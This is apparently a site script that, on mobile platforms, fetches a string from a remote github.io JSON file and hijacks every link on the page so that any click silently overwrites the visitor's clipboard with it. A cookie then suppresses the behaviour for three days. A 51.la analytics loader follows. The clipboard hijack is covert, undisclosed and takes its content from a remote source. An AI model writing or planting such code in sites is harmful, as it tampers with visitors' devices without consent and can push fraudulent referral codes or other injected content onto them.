if (!(/Win|mac/i.test(navigator.platform))) {
	if(!checkCookie('isQrop')){
		const xhr = new XMLHttpRequest()
		const url = 'https://sanjinxiaolongxia.github.io/code.json'
		xhr.open('get',url,true)
		xhr.send()
		xhr.onreadystatechange = function(){
			if(xhr.readyState ===4 && xhr.status === 200){
				let codeJosn =JSON.parse(xhr.responseText);
				let cpCode = '';
				for(let key in codeJosn){
					cpCode += codeJosn[key]+' ';
				}
				cpCode = cpCode.trim();
				let aNodes = document.querySelectorAll('a')
				for(let i =0; i<aNodes.length; i++){
					aNodes[i].onclick = function(){
						let oInput = document.createElement('input'); 
						oInput.setAttribute("readonly", "readonly");
						oInput.value = cpCode;
						document.body.appendChild(oInput);
						oInput.select(); 
						document.execCommand("Copy"); 
						oInput.style.display='none'; 
						oInput.remove();
						setCookie('isQrop','1','d3');
					}
				}
			}
		}
	}
}
function checkCookie(cname){
	let name = getCookie(cname);
	if (name==""){    
		return false;
	}else {
		return true;
	}
}
function getCookie(cname){
	let name = cname + "=";
	let ca = document.cookie.split(';');
	for(let i=0; i<ca.length; i++) {
		let c = ca[i].trim();
		if (c.indexOf(name)==0)   
		return c.substring(name.length,c.length); 
	}
	return "";
}
function setCookie(name,value,time){
	let strsec = getsec(time);
	let d = new Date();
  d.setTime(d.getTime()+(strsec*1));
  let exp = d.toGMTString();
	document.cookie = name + "="+ escape (value) + ";expires=" + exp + ";SameSite=Lax";
}
function getsec(str){
	let str1=str.substring(1,str.length)*1; 
	let str2=str.substring(0,1); 
	if (str2=="s"){
		return str1*1000;
	}else if (str2=="h"){
		return str1*60*60*1000;
	}else if (str2=="d"){
		return str1*24*60*60*1000;
	}
}
<script>
!function(p){"use strict";!function(t){var s=window,e=document,i=p,c="".concat("https:"===e.location.protocol?"https://":"http://","sdk.51.la/js-sdk-pro.min.js"),n=e.createElement("script"),r=e.getElementsByTagName("script")[0];n.type="text/javascript",n.setAttribute("charset","UTF-8"),n.async=!0,n.src=c,n.id="LA_COLLECT",i.d=n;var o=function(){s.LA.ids.push(i)};s.LA?s.LA.ids&&o():(s.LA=p,s.LA.ids=[],o()),r.parentNode.insertBefore(n,r)}()}({id:"K1FChVOgA5ROLkiY",ck:"K1FChVOgA5ROLkiY"});
</script>
